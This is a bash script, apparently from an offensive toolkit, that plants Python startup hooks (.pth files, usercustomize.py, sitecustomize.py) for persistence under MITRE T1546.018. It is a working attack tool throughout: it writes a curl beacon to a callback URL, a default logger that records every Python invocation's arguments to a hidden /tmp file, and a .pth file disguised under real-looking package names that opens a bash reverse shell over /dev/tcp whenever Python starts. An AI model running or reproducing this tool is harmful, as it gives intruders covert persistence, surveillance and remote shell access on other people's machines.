#!/bin/bash
#
# python_persist.sh — T1546.018 Python Startup Hooks
#
# Drops .pth files in site-packages (auto-import on every Python invocation),
# creates usercustomize.py / sitecustomize.py for system-wide code execution
# whenever ANY Python script runs.
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="# d3m0n_python_hook"

banner_python() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1546.018 — Python Startup Hooks                    ║"
    echo "  ║   .pth files / usercustomize / sitecustomize          ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Find all Python site-packages directories
find_site_packages() {
    local -a dirs=()
    for pybin in python3 python python2; do
        if command -v "$pybin" &>/dev/null; then
            local sp
            sp=$("$pybin" -c "import site; print(site.getsitepackages()[0])" 2>/dev/null)
            [[ -n "$sp" && -d "$sp" ]] && dirs+=("$sp")
            local usp
            usp=$("$pybin" -c "import site; print(site.getusersitepackages())" 2>/dev/null)
            [[ -n "$usp" ]] && dirs+=("$usp")
        fi
    done
    printf '%s\n' "${dirs[@]}" | sort -u
}

# ── [1] .pth file injection ──
pth_inject() {
    echo -e "${CYAN}[*] .pth File Injection${NC}"
    echo -e "${YELLOW}    Every .pth file in site-packages is processed on Python startup.${NC}"
    echo -e "${YELLOW}    Lines starting with 'import' are executed as code.${NC}"
    echo ""

    echo -e "${YELLOW}[?] Python payload (single line, e.g. 'import os; os.system(\"curl http://ATTACKER/beacon &\")'):${NC}"
    read -r PAYLOAD
    if [[ -z "$PAYLOAD" ]]; then
        echo -e "${RED}[!] No payload specified.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] .pth filename (will be placed in site-packages, e.g. 'setuptools-config'):${NC}"
    read -r PTH_NAME
    PTH_NAME="${PTH_NAME:-system-path-config}"

    echo -e "${CYAN}[*] Available site-packages directories:${NC}"
    local -a SP_DIRS=()
    while IFS= read -r d; do
        SP_DIRS+=("$d")
    done < <(find_site_packages)

    if [[ ${#SP_DIRS[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No site-packages directories found.${NC}"
        return 1
    fi

    local i=1
    for d in "${SP_DIRS[@]}"; do
        echo -e "  [${i}] ${d}"
        i=$((i + 1))
    done
    echo -e "  [${i}] All of the above"

    echo -e "${YELLOW}[?] Select target:${NC}"
    read -r TCHOICE

    local -a targets=()
    if [[ "$TCHOICE" -eq "$i" ]]; then
        targets=("${SP_DIRS[@]}")
    elif [[ "$TCHOICE" -ge 1 && "$TCHOICE" -lt "$i" ]]; then
        targets=("${SP_DIRS[$((TCHOICE - 1))]}")
    else
        echo -e "${RED}[!] Invalid choice.${NC}"
        return 1
    fi

    for target in "${targets[@]}"; do
        mkdir -p "$target" 2>/dev/null
        local pth_file="${target}/${PTH_NAME}.pth"
        echo "${MARKER}" > "$pth_file"
        echo "import ${PAYLOAD%%;;*}" >> "$pth_file"
        # If payload doesn't start with import, wrap it
        if [[ "$PAYLOAD" != import* ]]; then
            echo "import os; os.system('${PAYLOAD}')" > "$pth_file"
            echo "${MARKER}" >> "$pth_file"
        fi
        chmod 644 "$pth_file" 2>/dev/null
        echo -e "${GREEN}  [+] Created: ${pth_file}${NC}"
    done
}

# ── [2] usercustomize.py (per-user, runs on every Python invocation) ──
usercustomize_inject() {
    echo -e "${CYAN}[*] usercustomize.py — runs on every Python invocation for the current user${NC}"

    echo -e "${YELLOW}[?] Python payload (multiline OK, end with empty line):${NC}"
    local payload=""
    while IFS= read -r line; do
        [[ -z "$line" ]] && break
        payload+="${line}"$'\n'
    done

    if [[ -z "$payload" ]]; then
        echo -e "${YELLOW}[?] Use default beacon payload? (y/n):${NC}"
        read -r yn
        if [[ "$yn" == "y" ]]; then
            echo -e "${YELLOW}[?] Callback URL:${NC}"
            read -r CALLBACK
            payload="import os, socket, subprocess
try:
    os.system('curl -s ${CALLBACK}/beacon?host=' + socket.gethostname() + ' &')
except:
    pass
"
        else
            echo -e "${RED}[!] No payload.${NC}"
            return 1
        fi
    fi

    # Find user site-packages
    local usp
    usp=$(python3 -c "import site; print(site.getusersitepackages())" 2>/dev/null)
    if [[ -z "$usp" ]]; then
        usp="${HOME}/.local/lib/python3/dist-packages"
    fi

    mkdir -p "$usp" 2>/dev/null
    local target="${usp}/usercustomize.py"

    cat > "$target" << PYEOF
${MARKER}
${payload}
PYEOF

    chmod 644 "$target"
    echo -e "${GREEN}[+] Created: ${target}${NC}"
    echo -e "${YELLOW}[*] Will execute on every Python invocation by $(whoami)${NC}"
}

# ── [3] sitecustomize.py (system-wide, ALL users, requires root) ──
sitecustomize_inject() {
    echo -e "${CYAN}[*] sitecustomize.py — runs on every Python invocation for ALL users${NC}"

    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required for system-wide injection.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] Python payload (multiline OK, end with empty line):${NC}"
    local payload=""
    while IFS= read -r line; do
        [[ -z "$line" ]] && break
        payload+="${line}"$'\n'
    done

    if [[ -z "$payload" ]]; then
        echo -e "${YELLOW}[?] Use default keylogger payload? (y/n):${NC}"
        read -r yn
        if [[ "$yn" == "y" ]]; then
            payload="import os, sys, datetime
try:
    _logf = '/tmp/.pylog_' + str(os.getuid())
    with open(_logf, 'a') as _f:
        _f.write(str(datetime.datetime.now()) + ' ' + os.getcwd() + ' ' + ' '.join(sys.argv) + '\\\\n')
except:
    pass
"
        else
            echo -e "${RED}[!] No payload.${NC}"
            return 1
        fi
    fi

    local -a SP_DIRS=()
    while IFS= read -r d; do
        SP_DIRS+=("$d")
    done < <(find_site_packages)

    for sp in "${SP_DIRS[@]}"; do
        [[ -d "$sp" ]] || continue
        local target="${sp}/sitecustomize.py"
        if [[ -f "$target" ]]; then
            if grep -q "$MARKER" "$target" 2>/dev/null; then
                echo -e "${YELLOW}  [!] Already injected in ${target}${NC}"
                continue
            fi
            # Append to existing
            cp "$target" "${target}.d3m0n_bak" 2>/dev/null
            echo "" >> "$target"
            echo "$MARKER" >> "$target"
            echo "$payload" >> "$target"
        else
            cat > "$target" << PYEOF
${MARKER}
${payload}
PYEOF
        fi
        chmod 644 "$target"
        echo -e "${GREEN}  [+] Injected: ${target}${NC}"
    done
}

# ── [4] Stealth .pth with legitimate-looking name ──
stealth_pth() {
    echo -e "${CYAN}[*] Stealth .pth — disguised as legitimate package config${NC}"

    echo -e "${YELLOW}[?] Reverse shell callback IP:${NC}"
    read -r LHOST
    echo -e "${YELLOW}[?] Reverse shell callback port:${NC}"
    read -r LPORT
    if [[ -z "$LHOST" || -z "$LPORT" ]]; then
        echo -e "${RED}[!] IP and port required.${NC}"
        return 1
    fi

    # Names that look like legitimate Python packages
    local -a STEALTH_NAMES=("_distutils_hack" "certifi-paths" "easy-install" "pkg_resources_init" "setuptools-pth")
    local chosen="${STEALTH_NAMES[$((RANDOM % ${#STEALTH_NAMES[@]}))]}"

    local -a SP_DIRS=()
    while IFS= read -r d; do
        [[ -d "$d" ]] && SP_DIRS+=("$d")
    done < <(find_site_packages)

    if [[ ${#SP_DIRS[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No writable site-packages found.${NC}"
        return 1
    fi

    local target="${SP_DIRS[0]}/${chosen}.pth"
    cat > "$target" << PTHEOF
import os; os.system('(nohup bash -c "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1" &>/dev/null &) 2>/dev/null')
PTHEOF
    chmod 644 "$target"
    echo -e "${GREEN}[+] Stealth .pth created: ${target}${NC}"
    echo -e "${YELLOW}[*] Reverse shell will trigger on every Python invocation${NC}"
}

# ── [5] Cleanup ──
cleanup_python() {
    echo -e "${CYAN}[*] Removing Python startup hooks...${NC}"

    local -a SP_DIRS=()
    while IFS= read -r d; do
        SP_DIRS+=("$d")
    done < <(find_site_packages)

    for sp in "${SP_DIRS[@]}"; do
        # Remove .pth files with our marker
        for pth in "$sp"/*.pth; do
            [[ -f "$pth" ]] || continue
            if grep -q "$MARKER" "$pth" 2>/dev/null; then
                rm -f "$pth"
                echo -e "${GREEN}  [+] Removed: ${pth}${NC}"
            fi
        done

        # Clean usercustomize.py
        local uc="${sp}/usercustomize.py"
        if [[ -f "$uc" ]] && grep -q "$MARKER" "$uc" 2>/dev/null; then
            rm -f "$uc"
            echo -e "${GREEN}  [+] Removed: ${uc}${NC}"
        fi

        # Restore sitecustomize.py
        local sc="${sp}/sitecustomize.py"
        if [[ -f "${sc}.d3m0n_bak" ]]; then
            mv "${sc}.d3m0n_bak" "$sc"
            echo -e "${GREEN}  [+] Restored: ${sc}${NC}"
        elif [[ -f "$sc" ]] && grep -q "$MARKER" "$sc" 2>/dev/null; then
            rm -f "$sc"
            echo -e "${GREEN}  [+] Removed: ${sc}${NC}"
        fi
    done

    echo -e "${GREEN}[+] Python hooks cleaned.${NC}"
}

# ── MAIN MENU ──
main_menu() {
    banner_python
    echo -e "  ${CYAN}[1]${NC} .pth file injection (custom payload)"
    echo -e "  ${CYAN}[2]${NC} usercustomize.py (per-user hook)"
    echo -e "  ${CYAN}[3]${NC} sitecustomize.py (system-wide, root)"
    echo -e "  ${CYAN}[4]${NC} Stealth .pth reverse shell (legitimate name)"
    echo -e "  ${CYAN}[5]${NC} Cleanup / Remove all hooks"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) pth_inject ;;
        2) usercustomize_inject ;;
        3) sitecustomize_inject ;;
        4) stealth_pth ;;
        5) cleanup_python ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
